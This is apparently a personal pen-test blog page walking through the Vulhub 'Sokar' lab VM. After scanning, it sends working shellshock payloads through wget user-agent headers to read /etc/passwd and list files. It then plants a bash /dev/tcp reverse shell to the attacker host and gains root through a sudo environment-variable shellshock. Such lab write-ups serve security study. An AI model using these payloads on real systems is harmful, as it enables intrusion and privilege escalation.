@@ -1,0 +1,303 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>vulhub-sokar  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Nikto
+User Agent Switcher Vulnerability: shellshock(remote)
+shellshock(local) Use netdiscover to detect target IP address &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Vulhub-sokar</h2>
+	<div class="entry-content"><h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>User Agent Switcher</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">shellshock(remote)</a></li>
+<li><a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">shellshock(local)</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.103 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.56.103 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 591 is opening, looks like it is running http service.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.56.103:591</code></p>
+
+<p>nothing cool.</p>
+
+<p>Use wufzz to scan</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.103/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting path <code>cgi-bin</code>. Thats interesting, because it reminds shellshock.</p>
+
+<p>Use brower to check the web page</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>The web page shows result of commands <code>netstat</code> and <code>iostat</code>.</p>
+
+<p>check the source code find the cgi path <code>/cgi-bin/cat</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>start to verfiy shellshock:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://192.168.56.103:591/cgi-bin/cat"</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/sokar/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Confirmed.Also find two user names <code>bynarr</code> and <code>apophis</code></p>
+
+<p>I tried to upload reverse shell</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.56.102/4444 0&lt;&1" "http://192.168.56.103:591/cgi-bin/cat"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>failed. I guess because certain ports are allowed.</p>
+
+<p>keep going&hellip;</p>
+
+<p>check the files belong to bynarr:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /usr/bin/find / -user bynarr " "http://192.168.56.103:591/cgi-bin/cat"</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/sokar/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Try to read each file I got, and find the <code>va/spool/mail/bynarr</code> is very interesting.</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>so now I know I can only use port 51242 to setup reverse shell.</p>
+
+<p>Also I noticed that <code>.</code> is in environment variable <code>$PATH</code>, so that I can run a script in the current path firstly.</p>
+
+<p>write the reverse shell to iostat:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/echo -e '#/bin/bash -i &gt;& /dev/tcp/192.168.56.102/51242 0&gt;&1' &gt; /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>add the x attribute</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/chmod +x /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After serverl seconds I got shell:</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>next run <code>sudo -l</code> to check allowed commands for bynarr</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>so /home/bynarr/lime which is owned by root that bynarr can run.</p>
+
+<p>in order to check shell shock locally. run:</p>
+
+<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>
+
+<p>local shell shock works</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>from the <code>sudo -l</code> output, there are many environment variables can be used. I ued USERNAME</p>
+
+<p><code>sudo USERNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-07-15T10:27:33-05:00" pubdate data-updated="true">2016-07-15 10:27:33 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/shellshock/'>shellshock</a>, <a class='category' href='/blog/categories/sokar/'>sokar</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
